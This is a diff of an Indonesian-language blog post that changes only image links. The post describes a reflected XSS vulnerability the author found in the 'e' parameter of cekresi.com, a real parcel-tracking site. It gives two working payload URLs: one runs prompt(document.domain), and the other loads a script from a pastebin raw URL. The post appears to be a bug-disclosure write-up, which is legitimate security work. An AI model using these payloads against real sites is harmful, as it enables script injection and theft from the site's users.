@@ -20,13 +20,13 @@ Parameter yang ku temukan seperti berikut **https://cekresi.com/m/index?viewstat
 https://cekresi.com/m/index?viewstate=&e="><script>prompt(document.domain);</script>&noresi=TAN
 ```
 Berikut penampakannya :
-{{< figure src="https://umirackb.sirv.com/tanmyid/xss-cekresi.png" alt="XSS ">}}
+{{< figure src="https://raw.githubusercontent.com/tanmyid/go-blog/master/img/xss-cekresi/xss-cekresi.png" alt="XSS ">}}
 
 Tak sampai disitu, saya juga mencoba untuk menggunakan script html dalam XSS kali ini dan ternyata berhasil. Berikut payloadnya :
 ```
 https://cekresi.com/m/index?viewstate=&e="><script src=https://pastebin.com/raw/mUBsAPXz/></script>&noresi=TAN
 ```
 Berikut penampakannya :
-{{< figure src="https://umirackb.sirv.com/tanmyid/xss-cekresi-2.png" alt="XSS ">}}
+{{< figure src="https://raw.githubusercontent.com/tanmyid/go-blog/master/img/xss-cekresi/xss-cekresi-2.png" alt="XSS ">}}
 
 Eh iya lupa, ini hanya berlaku pada browser mozilla firefox ya, kalian pasti sudah tau alasannya dong. Nah semoga bermanfaat bagi kalian. Terima Kasih.
